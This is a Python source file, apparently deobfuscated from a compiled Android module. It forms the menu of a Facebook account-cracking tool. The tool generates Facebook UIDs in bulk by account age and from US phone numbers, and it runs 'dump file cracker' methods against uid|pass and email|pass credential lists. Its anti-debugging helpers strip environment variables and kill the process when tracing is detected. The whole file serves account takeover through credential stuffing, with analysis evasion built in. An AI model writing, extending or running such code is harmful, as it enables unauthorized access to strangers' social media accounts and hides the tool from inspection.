# -*- coding: utf-8 -*-
"""
Reconstructed original source of core/menu.py
(deobfuscated from core/menu.cpython-314-aarch64-linux-android.so).

Main menu — entry point BNG_71_() called by main.py after approval.
"""
import os
import sys
import time
import random
from concurrent.futures import ThreadPoolExecutor as tred

import core.config
import core.crackers
import utils.generator
import utils.ui

M = '\xc3\x97'          # ÷
STAR = '\xe2\x98\x89'    # ☆
OK = '\xe2\x9c\x93'      # ✓
NO = '\xe2\x9c\x97'      # ✗
ARROW = '\xe2\x86\xa9'   # ↩
US_FLAG = '\xf0\x9f\x87\xba\xf0\x9f\x87\xb8'  # 🇺🇸


def _input(prompt):
    return input(prompt)


def ask(prompt, choices):
    while True:
        c = _input(prompt).strip().upper()
        if c in choices:
            return c
        print('Choose Valid Option... ')


# --- series cloners ----------------------------------------------------------
def old_One():   # 2009-2012 old clone
    limit = int(_input('How many IDs? '))
    uids = utils.generator.FastUIDGenerator.fast_old_uids(limit)
    print(f'{OK} Generated {len(uids)} UIDs instantly!')
    return uids


def old_Tow():   # 2004-2008 legacy
    limit = int(_input('How many IDs? '))
    uids = utils.generator.FastUIDGenerator.fast_2004_2008_uids(limit)
    print('\U0001f4c5 2004-2008 LEGACY SERIES')
    return uids


def old_Tree():  # 2013-2016
    limit = int(_input('How many UIDs? '))
    uids = utils.generator.FastUIDGenerator.fast_2013_2016_uids(limit)
    print('\U0001f4c5 2013-2016 SERIES CLONER')
    return uids


def old_clone(choice):
    return {'1': old_One, '2': old_Tow, '3': old_Tree}[choice]()


def clone_2004_2008(limit):
    return utils.generator.FastUIDGenerator.fast_2004_2008_uids(limit)


def clone_2013_2016(limit):
    return utils.generator.FastUIDGenerator.fast_2013_2016_uids(limit)


def usa_phone_clone(limit):
    print(f'{US_FLAG} USA PHONE MODE')
    print('Format: 10000 + AREA_CODE + PREFIX + LINE')
    print('Generates UIDs based on real US phone numbers')
    return utils.generator.FastUIDGenerator.fast_us_phone_uids(limit)


def usa_fb_clone(limit):
    print(f'{US_FLAG} USA ONLY - FAST FB UIDs')
    print('Generates US-based Facebook account UIDs at high speed')
    print('Speed: Instant generation via list comprehension')
    return utils.generator.FastUIDGenerator.fast_us_fb_uids(limit)


# --- login methods -----------------------------------------------------------
def login_1(credentials, workers):
    """Method A - Graph API (Fast)."""
    return core.crackers.DumpFileCracker.crack_dump_credentials('' , '1', workers)


def login_2(credentials, workers):
    """Method B - Legacy API (Stable)."""
    return core.crackers.DumpFileCracker.crack_dump_credentials('', '2', workers)


def login_usa(uids, workers):
    """Method C - Multi-API Rotation (Best) / USA mode."""
    return core.crackers.DumpFileCracker._crack_method_usa(uids, workers)


method_map = {'1': login_1, '2': login_2, '3': login_usa}


def crack_dump_file():
    filepath = _input('Enter dump file path: ')
    if not os.path.exists(filepath):
        print(f'{NO} File not found: ' + filepath)
        return
    print('\U0001f4c1 DUMP FILE CRACKER')
    print('Supports: uid|pass, email|pass, uid:pass formats')
    credentials = core.crackers.DumpFileCracker.parse_dump_file(filepath)
    print(f'{OK} Found {len(credentials)} credentials')
    meth = ask('Select method (1/2/3): ', ('1', '2', '3'))
    workers = int(_input('WORKERS: '))
    method_map[meth](credentials, workers)


# --- main menu ---------------------------------------------------------------
def BNG_71_():
    utils.ui._check()
    while True:
        utils.ui.clear()
        utils.ui.set_title()
        print(utils.ui.____banner____)
        print(utils.ui.____info____)
        print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>' + M + '<\x1b[38;5;46mALL SERIES')
        print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>' + M + '<\x1b[38;5;46m100003/4 SERIES')
        print('       \x1b[38;5;196m(\x1b[1;37mC\x1b[38;5;196m)\x1b[1;37m>' + M + '<\x1b[38;5;46m2004-2008 SERIES (LEGACY)')
        print('       \x1b[38;5;196m(\x1b[1;37mD\x1b[38;5;196m)\x1b[1;37m>' + M + '<\x1b[38;5;46mDUMP FILE CRACKER')
        print('       \x1b[38;5;196m(\x1b[1;37mP\x1b[38;5;196m)\x1b[1;37m>' + M + '<\x1b[38;5;46mUSA ONLY - PHONE UIDs')
        print('       \x1b[38;5;196m(\x1b[1;37mU\x1b[38;5;196m)\x1b[1;37m>' + M + '<\x1b[38;5;46mUSA ONLY - FAST FB UIDs')
        print()
        choice = ask('CHOICE ', ('A', 'B', 'C', 'D', 'P', 'U', '0'))
        if choice == '0':
            sys.exit(0)
        if choice == 'A':
            print('[1] Method A - Graph API (Fast)')
            print('[2] Method B - Legacy API (Stable)')
            print('[3] Method C - Multi-API Rotation (Best)')
            meth_choice = ask('(A/B/C): ', ('A', 'B', 'C'))
            if meth_choice == 'A':
                print('       ' + M + ' ALL SERIES')
                old_clone(ask('(A/B/C): 2009-2010 / 2010-2014 / 2013-2016', ('A', 'B', 'C')))
            elif meth_choice == 'B':
                clone_2013_2016(int(_input('How many UIDs? ')))
            else:
                clone_2004_2008(int(_input('How many IDs? ')))
        elif choice == 'B':
            print(' 20000 / 30000 / 99999')
            print('Prefixes: 100005-100009, 10001')
            limit = int(_input(' Choose Value Option... '))
            usa_fb_clone(limit)
        elif choice == 'C':
            print(' 2009-2010')
            print('USE AIRPLANE MODE')
            print('USE AIRPLANE MOD FOR GOOD RESULT')
            old_clone('1')
        elif choice == 'D':
            crack_dump_file()
        elif choice == 'P':
            print(f'{US_FLAG} USA ONLY - PHONE UIDs')
            usa_phone_clone(int(_input('How many UIDs? ')))
        elif choice == 'U':
            print(f'{US_FLAG} USA ONLY - FAST FB UIDs')
            usa_fb_clone(int(_input('How many UIDs? ')))
        print(f'{ARROW} Press Enter to continue...')
        _input('')


# --- shared anti-debug helpers (present in every module) --------------------
def _tracerpid():
    try:
        with open('/proc/self/status') as f:
            for line in f:
                if line.startswith('TracerPid:'):
                    return line.split(':')[1].strip()
    except Exception:
        pass
    return '?'


def _scrub():
    for var in ('LD_PRELOAD', 'LD_AUDIT', 'LD_DEBUG', 'DEBUGGER_ID',
                'PYTHONBREAKPOINT', 'PYTHONFAULTHANDLER', 'PYTHONINSPECT',
                'PYTHONSTARTUP'):
        os.environ.pop(var, None)


def _monitored():
    if _tracerpid() not in ('0', '?'):
        return True
    if getattr(sys, 'gettrace', lambda: None)() is not None:
        return True
    if getattr(sys, 'getprofile', lambda: None)() is not None:
        return True
    return False


def _require_gate():
    return core.config._require_gate()


def _check():
    _scrub()
    if _monitored():
        _die(7)


def _die(stage):
    import signal
    os.kill(os.getpid(), signal.SIGKILL)
